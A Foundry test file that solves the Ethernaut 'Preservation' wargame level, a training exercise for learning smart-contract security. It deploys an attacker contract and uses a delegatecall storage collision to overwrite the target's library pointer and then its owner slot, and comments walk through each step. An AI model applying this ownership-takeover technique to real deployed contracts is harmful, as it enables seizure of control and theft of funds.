// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Preservation.sol";

contract MiddleMan {
    address first;
    address second;
    address third;

    function setTime(uint256 time) public {
        third = address(uint160(time));
    }
}

// setFirstTime() with MiddleMan's address in uint256 to override timeZone1Library
// then setFirstTime() again to override owner's address,
// by having a function in MiddleMan that writes to the third slot (owner's slot)
contract PreservationTest is Test {
    Preservation instance;

    function setUp() public {
        address timeZone1Library = address(new LibraryContract());
        address timeZone2Library = address(new LibraryContract());
        instance = new Preservation(timeZone1Library, timeZone2Library);
        // instance = Preservation(vm.envAddress("PRESERVATION"));
    }

    function test() public {
        MiddleMan middleMan = new MiddleMan();

        // console.logUint(uint256(uint160(address(vm.envAddress("PRESERVATION_MIDDLEMAN")))));
        // can also use setSecondTime() as both functions modify the first slot
        instance.setFirstTime(uint256(uint160(address(middleMan))));
        assertEq(instance.timeZone1Library(), address(middleMan));

        // console.logUint(uint256(uint160(vm.envAddress("MY_ADDRESS"))));
        // instance.setFirstTime(uint256(uint160(vm.envAddress("MY_ADDRESS"))));
        // assertEq(instance.owner(), vm.envAddress("MY_ADDRESS"));
        instance.setFirstTime(uint256(uint160(address(middleMan))));
        assertEq(instance.owner(), address(middleMan));
    }
}
